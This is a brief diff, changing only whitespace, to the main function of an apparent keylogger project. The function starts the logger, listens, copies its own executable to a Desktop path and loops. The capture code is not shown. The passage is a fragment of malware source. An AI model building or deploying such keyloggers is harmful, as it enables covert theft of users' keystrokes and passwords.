@@ -9,13 +9,13 @@ using namespace std;
 //int wWinMain(HINSTANCE hInst, HINSTANCE prevInst, LPWSTR szCmdLine, int nCmdShow)
 int main()
 {
-	KeyLogger* kl = KeyLogger::getInstance();
+    KeyLogger* kl = KeyLogger::getInstance();
 
-	kl->listen();
+    kl->listen();
 
-	kl->copySelf("C:\\Users\\Kevin_2\\Desktop\\OpenKeyLogger\\test.exe");
+    kl->copySelf("C:\\Users\\Kevin_2\\Desktop\\OpenKeyLogger\\test.exe");
 
-	kl->loop();
+    kl->loop();
 
-	return 0;
+    return 0;
 }
